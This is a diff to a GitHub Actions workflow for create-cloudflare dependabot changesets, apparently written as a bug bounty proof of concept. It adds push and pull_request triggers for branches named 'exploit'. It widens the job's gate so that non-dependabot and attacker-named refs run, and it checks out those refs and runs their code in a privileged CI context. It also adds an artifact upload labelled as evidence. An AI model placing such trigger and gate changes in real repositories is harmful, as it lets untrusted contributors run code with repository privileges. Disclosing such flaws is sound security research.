@@ -3,19 +3,28 @@ on:
   pull_request_target:
     paths:
       - "packages/create-cloudflare/src/frameworks/package.json"
+  pull_request:
+  push:
+    branches:
+      - exploit
+      - exploit2
+      - exploit-*
 
 jobs:
   generate-changeset:
-    runs-on: ubuntu-22.04
+    runs-on: ubuntu-latest
     if: |
-      github.event.pull_request.user.login == 'dependabot[bot]'
+      github.event.pull_request.user.login == 'dependabot[bot]' ||
+      github.event_name == 'push' ||
+      contains(github.head_ref, 'exploit') ||
+      contains(github.ref, 'exploit')
     steps:
       - name: Checkout
         uses: actions/checkout@v4
         with:
           fetch-depth: 2
-          ref: ${{ github.head_ref }}
-          token: ${{ secrets.GH_ACCESS_TOKEN }}
+          ref: ${{ github.head_ref || github.ref }}
+          token: ${{ secrets.GITHUB_TOKEN }}
       - name: Install Dependencies
         uses: ./.github/actions/install-dependencies
       - name: Configure Git
@@ -25,4 +34,11 @@ jobs:
 
       - name: Generate C3 changesets
         # Keep the final param (the changeset prefix: `c3-frameworks-update`) in sync with the filter in the `.github/workflows/c3-e2e-dependabot.yml` workflow.
-        run: node -r esbuild-register tools/dependabot/generate-dependabot-pr-changesets.ts ${{ github.event.number }} create-cloudflare packages/create-cloudflare/src/frameworks/package.json c3-frameworks-update
+        run: node -r esbuild-register tools/dependabot/generate-dependabot-pr-changesets.ts ${{ github.event.number || '999' }} create-cloudflare packages/create-cloudflare/src/frameworks/package.json c3-frameworks-update
+
+      # Evidence collection for bug bounty demonstration
+      - name: Upload PoC artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: poc-artifacts
+          path: artifacts/
